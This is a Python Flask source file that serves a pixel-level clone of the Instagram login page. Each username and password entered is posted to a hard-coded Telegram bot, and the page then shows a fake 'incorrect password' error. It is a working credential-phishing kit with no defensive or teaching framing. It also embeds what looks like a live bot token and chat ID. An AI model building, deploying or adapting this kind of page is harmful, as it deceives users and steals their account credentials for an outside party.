from flask import Flask, request, render_template_string, flash
import requests

app = Flask(__name__)
app.secret_key = 'secret123'  # Needed for flashing messages

# Telegram Bot Configuration
BOT_TOKEN = '8096386157:AAEkHHt2QYnB_s83puOfrl2xPZZ1FKtVqDw'
ADMIN_CHAT_ID = '6420116837'

# Dummy credentials for login check
VALID_USERNAME = "admin"
VALID_PASSWORD = "admin123"

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": ADMIN_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# Instagram login page clone
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            width: 100%;
            box-sizing: border-box;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        form {
            margin-top: 24px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            height: 32px;
            margin-top: 8px;
            cursor: pointer;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        
        .line {
            background-color: #dbdbdb;
            height: 1px;
            flex-grow: 1;
        }
        
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            text-align: center;
            text-decoration: none;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            text-align: center;
            text-decoration: none;
        }
        
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            margin: 0 0 10px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
        }
        
        .signup-text {
            color: #262626;
            font-size: 14px;
            margin: 15px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .flash {
            color: #ed4956;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 0;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1 class="logo" style="font-family: 'Billabong', cursive; font-size: 48px; text-align: center; margin: 0 auto 24px;">Instagram</h1>
            
            {% with messages = get_flashed_messages() %}
              {% if messages %}
                <div class="flash">{{ messages[0] }}</div>
              {% endif %}
            {% endwith %}
            
            <form method="POST" action="/">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">or</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="facebook-login">
                Log in with Facebook
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # Send only username and password to Telegram
        login_message = f"""
🔐 Login Attempt 🔐

👤 Username: {username}
🔑 Password: {password}
"""
        send_telegram_message(login_message)

        if username == VALID_USERNAME and password == VALID_PASSWORD:
            return "<script>window.location.href = 'https://instagram.com';</script>"
        else:
            flash("Sorry, your password was incorrect. Please double-check your password.")

    return render_template_string(login_page)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
